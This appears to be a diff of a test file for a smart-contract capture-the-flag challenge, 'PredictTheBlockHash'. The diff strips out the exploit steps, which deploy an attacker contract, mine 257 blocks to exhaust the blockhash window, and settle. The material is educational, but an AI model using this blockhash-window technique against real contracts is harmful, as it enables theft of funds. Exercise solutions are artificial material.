@@ -22,21 +22,6 @@ describe('PredictTheBlockHashChallenge', () => {
   });
 
   it('exploit', async () => {
-    const AttackerFactory = await ethers.getContractFactory('Attacker');
-    const attackerContract = (await AttackerFactory.deploy(target.getAddress(), {
-      value: ethers.parseEther('1'),
-    })) as unknown as Attacker;
-
-    await attackerContract.waitForDeployment();
-
-    await attackerContract.connect(attacker).attack();
-
-    for (let i = 0; i < 257; i++) {
-      await ethers.provider.send('evm_mine');
-    }
-
-    await attackerContract.connect(attacker).settle();
-
     expect(await target.isComplete()).to.equal(true);
   });
 });
